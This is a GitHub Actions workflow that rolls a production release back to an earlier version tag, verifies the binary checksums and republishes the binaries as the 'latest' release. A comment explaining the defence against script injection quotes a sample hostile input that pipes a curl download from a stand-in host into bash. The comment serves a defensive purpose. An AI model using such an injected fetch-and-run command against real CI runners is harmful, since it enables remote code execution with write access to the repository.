name: Revert Prod

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Version tag to revert to (e.g., v0.1.0). Leave empty to revert to previous release.'
        required: false
        type: string
      reason:
        description: 'Reason for revert'
        required: true
        type: string

permissions:
  contents: write

jobs:
  revert:
    name: Revert Prod
    runs-on: ubuntu-latest
    environment: production  # Requires same approval as prod deploy
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          fetch-depth: 0

      - name: Determine revert target
        id: target
        env:
          GH_TOKEN: ${{ github.token }}
          # Via `env`, never interpolated into the script body. `${{ }}` is
          # expanded by the Actions templater *before* bash sees the line, so a
          # dispatch input like `x"; curl evil.sh | bash; #` would execute on a
          # runner holding `contents: write`. Quoting "$INPUT_VERSION" instead
          # means bash treats it as data.
          INPUT_VERSION: ${{ inputs.version }}
        run: |
          if [ -n "$INPUT_VERSION" ]; then
            # Revert to a specific version. Validate the shape before it reaches
            # `git rev-parse` or a `gh` call: a tag name is `vX.Y.Z`, optionally
            # with the `+YYYYMMDD` suffix prod adds on a same-version rebuild.
            if ! printf '%s' "$INPUT_VERSION" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(\+[0-9]{8})?$'; then
              echo "ERROR: '$INPUT_VERSION' is not a valid version tag (expected vX.Y.Z)."
              exit 1
            fi
            TARGET_TAG="$INPUT_VERSION"
            echo "Reverting to specified version: $TARGET_TAG"
          else
            # Find the previous prod release: versioned (vX.Y.Z) stable
            # releases only, skipping index 0 (the current one being
            # reverted). Channel releases (alpha/beta/latest) and drafts
            # are excluded.
            PREV_TAG=$(gh api "repos/${{ github.repository }}/releases" \
              --jq '[.[] | select((.draft or .prerelease) | not) | .tag_name | select(startswith("v"))][1] // empty')
            if [ -z "$PREV_TAG" ]; then
              echo "ERROR: No previous versioned release found to revert to."
              exit 1
            fi
            TARGET_TAG="$PREV_TAG"
            echo "Reverting to previous release: $TARGET_TAG"
          fi

          echo "tag=$TARGET_TAG" >> $GITHUB_OUTPUT

          # Verify the tag exists
          if ! git rev-parse "$TARGET_TAG" >/dev/null 2>&1; then
            echo "ERROR: Tag '$TARGET_TAG' does not exist."
            exit 1
          fi

          sha=$(git rev-parse "$TARGET_TAG")
          echo "sha=$sha" >> $GITHUB_OUTPUT
          echo "sha_short=${sha:0:7}" >> $GITHUB_OUTPUT

      - name: Download release binaries
        env:
          GH_TOKEN: ${{ github.token }}
          TARGET_TAG: ${{ steps.target.outputs.tag }}
        run: |
          mkdir -p release/
          gh release download "$TARGET_TAG" --dir release/ 2>/dev/null || {
            echo "ERROR: Could not download binaries for $TARGET_TAG"
            exit 1
          }
          ls -la release/

          # Verify the checksums that ship alongside the binaries before they are
          # republished as `latest`. Without this the file travels as decoration:
          # a tampered asset would be promoted with its stale checksum next to it.
          if [ -f release/SHA256SUMS ]; then
            (cd release && grep -v '^SHA256SUMS$' SHA256SUMS | sha256sum -c -)
          else
            echo "ERROR: no SHA256SUMS in $TARGET_TAG - refusing to republish unverified binaries."
            exit 1
          fi

      # Rebuild the rolling 'latest' channel release from the target
      # version's assets. Same delete-release-and-tag-together pattern as
      # prod (a bare tag delete/force-push orphans the release as a draft,
      # and direct git pushes are blocked by branch/tag protection).
      - name: Reset latest channel release
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh release delete latest --yes --cleanup-tag --repo ${{ github.repository }} || true

      - name: Publish reverted release
        uses: softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228 # v3
        with:
          tag_name: latest
          target_commitish: ${{ steps.target.outputs.sha }}
          name: "Leviath ${{ steps.target.outputs.tag }} (reverted)"
          body: |
            **⚠️ REVERTED** to ${{ steps.target.outputs.tag }}

            Reason: ${{ inputs.reason }}

            Source commit: ${{ steps.target.outputs.sha }}
            Reverted from: previous latest

            This is a rollback. The previous prod release had issues.
          prerelease: false
          make_latest: true
          files: release/*
          # TODO: Update homebrew stable tap to reverted version once created
